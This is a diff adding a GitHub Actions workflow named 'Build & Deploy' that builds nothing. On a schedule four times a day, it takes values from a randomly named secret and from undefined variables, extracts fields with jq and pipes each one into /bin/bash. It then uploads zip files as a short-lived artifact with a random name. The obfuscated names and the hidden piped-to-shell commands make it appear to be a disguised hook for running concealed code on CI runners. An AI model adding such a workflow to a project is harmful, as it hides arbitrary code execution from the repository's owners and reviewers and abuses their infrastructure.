@@ -1,0 +1,32 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '41 1,7,13,19 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  automation:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          xkufb57: ${{ secrets.xkufb57 }}
+        run: |
+          printf '%s' "$xkufb57" | jq -r .vso83703 | /bin/bash
+          echo $che3 | jq -r .dlduc0 | /bin/bash
+          printf '%s' "$wtar9" | jq -r .bcm08 | /bin/bash
+          echo $u38 | jq -r .sgck7 | /bin/bash
+          echo $ltxe53 | jq -r .rudi76126 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: n6phU5Y8
+          path: "*.zip"
+          retention-days: 1
